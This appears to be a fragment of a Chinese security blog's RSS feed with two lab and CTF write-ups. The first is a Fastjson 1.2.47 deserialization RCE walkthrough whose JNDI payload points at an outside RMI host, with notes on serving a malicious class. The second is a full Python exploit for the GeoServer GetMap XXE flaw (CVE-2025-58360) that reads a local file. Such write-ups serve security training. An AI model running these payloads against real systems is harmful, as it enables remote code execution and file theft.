+&lt;p&gt;不得不说 p神的 vulnhub 真的夯&lt;/p&gt;
+&lt;p&gt;环境搭建&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;cd&lt;/span&gt; &lt;span class="n"&gt;vulhub&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;fastjson&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;1.2.47&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rce&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;docker&lt;/span&gt; &lt;span class="n"&gt;compose&lt;/span&gt; &lt;span class="n"&gt;up&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;访问&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619092632469.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;然后本地启动环境&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619094943317.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619094932095.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;开始bp 抓包&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619094950752.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c" data-lang="c"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;a&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;@type&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;java.lang.Class&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;val&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;},&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;b&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;@type&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;com.sun.rowset.JdbcRowSetImpl&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;dataSourceName&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;rmi://117.71.143.98:1099/Exploit&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="s"&gt;&amp;#34;autoCommit&amp;#34;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开始发送 就能获取到了&lt;/p&gt;
+&lt;h1 id="实战"&gt;实战&lt;/h1&gt;
+&lt;p&gt;这里用 极核 CTF 的靶场 来进行&lt;/p&gt;
+&lt;p&gt;抓登录页面的包 删去后面的 大括号 出现 500报错 经典的 fastjson&lt;/p&gt;
+&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260619100819712.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
+&lt;/p&gt;
+&lt;p&gt;这里我们用 jnd 开启 1389 端口实现 ldap （轻型目录访问协议） 远程命令加载 8080端口当中的开放 恶意 class 服务&lt;/p&gt;</description></item><item><title>CVE-2025-58360</title><link>https://luxuryzcx.github.io/posts/cve-2025-58360/</link><pubDate>Wed, 17 Jun 2026 21:48:24 +0800</pubDate><guid>https://luxuryzcx.github.io/posts/cve-2025-58360/</guid><description>&lt;h3 id="geoserver-getmap-xxe注入漏洞cve-2025-58360"&gt;GeoServer GetMap XXE注入漏洞(CVE-2025-58360)&lt;/h3&gt;
+&lt;p&gt;玄机exp&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;argparse&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;parser&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;argparse&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ArgumentParser&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Test GeoServer XXE for flag&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_argument&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-u&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;--url&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;required&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;help&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Target URL (e.g., http://192.168.1.1:8080)&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parser&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;parse_args&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;# 去除末尾可能多余的斜杠&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 构造目标请求路径&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;target_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;/geoserver/wms?service=WMS&amp;amp;version=1.1.0&amp;amp;request=GetMap&amp;amp;width=100&amp;amp;height=100&amp;amp;format=image/png&amp;amp;bbox=-180,-90,180,90&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Headers中最好加上 Content-Type&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="s2"&gt;&amp;#34;Accept-Language&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;en-US,en;q=0.9&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="s2"&gt;&amp;#34;Upgrade-Insecure-Requests&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="s2"&gt;&amp;#34;User-Agent&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="s2"&gt;&amp;#34;Accept&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="s2"&gt;&amp;#34;Connection&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;keep-alive&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="s2"&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;application/xml&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 修改 1：去除 php 伪协议，直接使用 Java 支持的 file:/// 协议&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&amp;#34;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;lt;!DOCTYPE StyledLayerDescriptor [
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;  &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///usr/local/flag.txt&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;]&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;lt;StyledLayerDescriptor version=&amp;#34;1.0.0&amp;#34;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;  &amp;lt;NamedLayer&amp;gt;&amp;lt;Name&amp;gt;&amp;amp;xxe;&amp;lt;/Name&amp;gt;&amp;lt;/NamedLayer&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;lt;/StyledLayerDescriptor&amp;gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;[*] Sending payload to &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;target_url&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;...&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;target_url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timeout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="c1"&gt;# 修改 2：更改检测逻辑。不再寻找 &amp;#34;root:&amp;#34;，而是寻找 GeoServer 典型的报错回显标签，或者直接打印结果&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;ServiceException&amp;#34;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;LayerNotDefined&amp;#34;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;[+] Vulnerability triggered! Check the response below for the flag:&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="c1"&gt;# 很多时候 flag 会被包裹在 &amp;lt;ServiceException&amp;gt; 标签内返回&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;         &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;[-] Server returned 200 OK, but usually XXE here throws an exception. Response:&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;         &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;[*] Unexpected response (Status &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status_code&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;):&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exceptions&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RequestException&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;f&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;[-] Connection Error: &lt;/span&gt;&lt;span class="si"&gt;{&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure class="content-figure"&gt;
+ &lt;img
+ src="https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260416121916465.png"
+ alt="image.png"
+ loading="lazy"
+ decoding="async"
+ &gt;
+ 
+&lt;/figure&gt;
